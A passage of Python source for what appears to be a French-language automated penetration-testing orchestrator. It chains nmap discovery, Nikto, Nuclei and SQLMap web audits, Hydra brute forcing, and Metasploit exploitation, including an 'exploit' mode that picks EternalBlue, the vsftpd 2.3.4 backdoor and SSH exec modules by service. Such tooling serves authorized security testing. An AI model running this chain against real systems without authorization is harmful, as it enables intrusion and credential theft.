        self.metasploit = MetasploitWrapper(self.tools_manager)
    
    def get_tool_status(self) -> Dict[str, Any]:
        """Retourne le statut de tous les outils"""
        tools_status = self.tools_manager.verify_tools()
        
        # Test spécial pour Metasploit
        msf_test = self.metasploit.test_metasploit_availability()
        tools_status['metasploit_detailed'] = msf_test
        
        return {
            'tools_available': tools_status,
            'wordlists': self.tools_manager.wordlists,
            'tools_dir': self.tools_manager.tools_dir,
            'initialized_at': datetime.now().isoformat(),
            'metasploit_info': msf_test
        }
    
    def run_discovery(self, target: str) -> Dict[str, Any]:
        """Lance une découverte réseau complète - VERSION CORRIGÉE"""
        logger.info(f"🌐 Début découverte réseau: {target}")
        
        # 1. Ping scan pour découvrir les hôtes
        ping_result = self.nmap.ping_scan(target)
        
        if not ping_result['success']:
            return {
                'success': False,
                'error': f"Échec du ping scan: {ping_result['stderr']}",
                'target': target
            }
        
        # 2. Port scan sur les hôtes découverts
        port_results = []
        discovered_hosts = ping_result.get('parsed', {}).get('hosts_found', [])
        
        for host in discovered_hosts[:10]:  # Limiter à 10 hôtes max
            host_target = host['host']
            
            # ✅ FIX: Extraire seulement l'IP du nom d'hôte complexe
            if '(' in host_target and ')' in host_target:
                # Extraire l'IP entre parenthèses: "nom (192.168.1.1)" -> "192.168.1.1"
                ip_match = re.search(r'\(([0-9.]+)\)', host_target)
                if ip_match:
                    host_target = ip_match.group(1)
            
            logger.info(f"🔍 Scan de ports sur: {host_target}")
            
            docker_ports = '21,22,23,25,53,80,111,135,139,443,445,512,513,514,993,995,1099,1433,1524,1723,2121,3000,3306,3389,4369,5000,5432,5555,5672,5900,5984,6000,6379,6667,8000,8009,8080,8180,8443,8888,9000,9042,9200,9300,11211,27017,27018,27019,28017'
            port_result = self.nmap.port_scan(host_target, docker_ports)
            port_results.append({
                'host': host_target,
                'original_host': host['host'],  # Garder le nom original
                'ports': port_result
            })
        
        return {
            'success': True,
            'target': target,
            'ping_scan': ping_result,
            'port_scans': port_results,
            'summary': {
                'hosts_discovered': len(discovered_hosts),
                'hosts_scanned': len(port_results)
            }
        }
    
    def run_web_audit(self, target: str, port: int = 80, ssl: bool = False) -> Dict[str, Any]:
        """Lance un audit web complet - VERSION CORRIGÉE"""
        logger.info(f"🕷️ Début audit web: {target}:{port} (SSL: {ssl})")
        
        results = {}
        
        # 1. Nikto scan
        logger.info("🕷️ Lancement Nikto...")
        nikto_result = self.nikto.web_scan(target, port, ssl)
        results['nikto'] = nikto_result
        logger.info(f"🕷️ Nikto terminé: {nikto_result.get('parsed', {}).get('total_vulnerabilities', 0)} vulns")
        
        # 2. Nuclei scan
        logger.info("🎯 Lancement Nuclei...")
        protocol = 'https' if ssl else 'http'
        url = f"{protocol}://{target}:{port}"
        nuclei_result = self.nuclei.vulnerability_scan(url)
        results['nuclei'] = nuclei_result
        logger.info(f"🎯 Nuclei terminé: {nuclei_result.get('parsed', {}).get('total_vulnerabilities', 0)} vulns")
        
        # 3. SQLMap scan (sur l'URL de base)
        logger.info("💉 Lancement SQLMap...")
        sqlmap_result = self.sqlmap.sql_injection_scan(url)
        results['sqlmap'] = sqlmap_result
        logger.info(f"💉 SQLMap terminé: injection = {sqlmap_result.get('parsed', {}).get('injection_found', False)}")
        
        # Calculer le résumé
        nikto_vulns = results['nikto'].get('parsed', {}).get('total_vulnerabilities', 0)
        nuclei_vulns = results['nuclei'].get('parsed', {}).get('total_vulnerabilities', 0)
        sql_injection = results['sqlmap'].get('parsed', {}).get('injection_found', False)
        
        return {
            'success': True,
            'target': f"{target}:{port}",
            'ssl': ssl,
            'results': results,
            'summary': {
                'nikto_vulns': nikto_vulns,
                'nuclei_vulns': nuclei_vulns,
                'sql_injection': sql_injection,
                'total_issues': nikto_vulns + nuclei_vulns + (1 if sql_injection else 0)
            }
        }
    
    def run_brute_force(self, target: str, service: str, userlist: str = None, 
                       passwordlist: str = None) -> Dict[str, Any]:
        """Lance une attaque par force brute"""
        logger.info(f"🔨 Début force brute: {target} ({service})")
        
        # Utiliser les wordlists par défaut si non spécifiées
        if not passwordlist:
            passwordlist = self.tools_manager.wordlists.get('common_passwords')
        
        result = self.hydra.brute_force(
            target=target,
            service=service,
            userlist=userlist,
            passwordlist=passwordlist
        )
        
        return {
            'success': result['success'],
            'target': target,
            'service': service,
            'result': result,
            'credentials_found': result.get('parsed', {}).get('credentials_found', [])
        }

    def run_exploitation(self, target: str, port: int = None, service: str = None, 
                        exploit_module: str = None, options: Dict = None) -> Dict[str, Any]:
        """Lance une exploitation avec Metasploit - VERSION CORRIGÉE POUR SÉLECTION MODULE"""
        logger.info(f"🎯 Début exploitation: {target}")
        
        start_time = time.time()
        
        try:
            # ✅ CORRECTION: Utiliser exactement le module fourni
            if exploit_module:
                # Module explicitement fourni → l'utiliser sans modification
                final_module = exploit_module
                logger.info(f"🎯 Module explicite fourni: {final_module}")
            else:
                # Pas de module fourni → auto-sélection selon service et mode
                mode = options.get('mode', 'safe') if options else 'safe'
                
                if not service:
                    logger.warning("⚠️ Aucun service ni module spécifié, utilisation du fallback")
                    final_module = 'auxiliary/scanner/portscan/tcp'
                else:
                    # Auto-sélection selon le service ET le mode
                    if mode == 'safe':
                        service_defaults = {
                            'ssh': 'auxiliary/scanner/ssh/ssh_version',
                            'http': 'auxiliary/scanner/http/http_version',
                            'smb': 'auxiliary/scanner/smb/smb_version',
                            'ftp': 'auxiliary/scanner/ftp/ftp_version'
                        }
                    elif mode == 'test':
                        service_defaults = {
                            'ssh': 'auxiliary/scanner/ssh/ssh_login',
                            'http': 'auxiliary/scanner/http/http_login',
                            'smb': 'auxiliary/scanner/smb/smb_login',
                            'ftp': 'auxiliary/scanner/ftp/ftp_login'
                        }
                    else:  # exploit mode
                        service_defaults = {
                            'ssh': 'exploit/multi/ssh/sshexec',
                            'smb': 'exploit/windows/smb/ms17_010_eternalblue',
                            'ftp': 'exploit/unix/ftp/vsftpd_234_backdoor'
                        }
                    
                    final_module = service_defaults.get(service.lower(), f'auxiliary/scanner/{service}/{service}_version')
                
                logger.info(f"🤖 Module auto-sélectionné: {final_module} (service: {service}, mode: {mode})")
            
            # Port par défaut selon le service
            if not port and service:
                port_mapping = {
                    'ssh': 22, 'ftp': 21, 'telnet': 23, 'smtp': 25,
                    'http': 80, 'https': 443, 'smb': 445, 'mysql': 3306
                }
                port = port_mapping.get(service.lower(), 80)
            
            # ✅ LANCER avec le module final déterminé
            logger.info(f"🚀 Lancement effectif: {final_module} sur {target}:{port}")
            
            # ✅ CORRECTION PRINCIPALE: Passer le module exact aux fonctions
            if final_module.startswith('auxiliary/'):
                # Passer le module exact dans les options
                enhanced_options = options.copy() if options else {}
                enhanced_options['explicit_module'] = final_module  # ✅ NOUVEAU: Forcer le module exact
                
                result = self.metasploit.run_auxiliary_scan(
                    target, port or 80, service or 'unknown', enhanced_options
                )
            else:
                result = self.metasploit.run_exploit_module(
                    target, port or 80, final_module, options
                )

            duration = int(time.time() - start_time)
            
            return {
                'success': result['success'],
                'target': target,
                'port': port,
                'service': service,
                'exploit_module': exploit_module,
                'duration': duration,
                'result': result,
                'summary': self._create_exploitation_summary(result),
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            duration = int(time.time() - start_time)
            error_msg = str(e)
            logger.error(f"❌ Erreur exploitation Metasploit: {error_msg}")
            
            return {
                'success': False,
                'target': target,
                'port': port,
                'service': service,
                'exploit_module': exploit_module or final_module if 'final_module' in locals() else 'unknown',
                'error': error_msg,
                'duration': duration,
                'timestamp': datetime.now().isoformat()
            }


    def _create_exploitation_summary(self, result: Dict) -> str:
        """Crée un résumé lisible des résultats d'exploitation - VERSION CORRIGÉE"""
        if not result.get('success'):
            return f"❌ Échec de l'exploitation: {result.get('error', 'Erreur inconnue')}"
        
        parsed = result.get('parsed_result', {})
        sessions = parsed.get('sessions_opened', 0)
        status = parsed.get('status', 'unknown')
        
        # ✅ CORRECTION: Messages basés sur le statut réel
        if sessions > 0:
            return f"🎯 Exploitation réussie ! {sessions} session(s) ouverte(s)"
        elif status == 'not_vulnerable':
            return "🚫 Cible non vulnérable à ce module"
        elif status == 'exploit_failed':
            return "❌ Exploitation tentée mais échec (aucune session créée)"
        elif status == 'vulnerable':
            return "⚠️ Cible vulnérable mais exploitation incomplète"
        elif status == 'error':
            return "🔧 Erreurs détectées - voir les détails"
        else:
            return "ℹ️ Exploitation terminée - statut incertain"
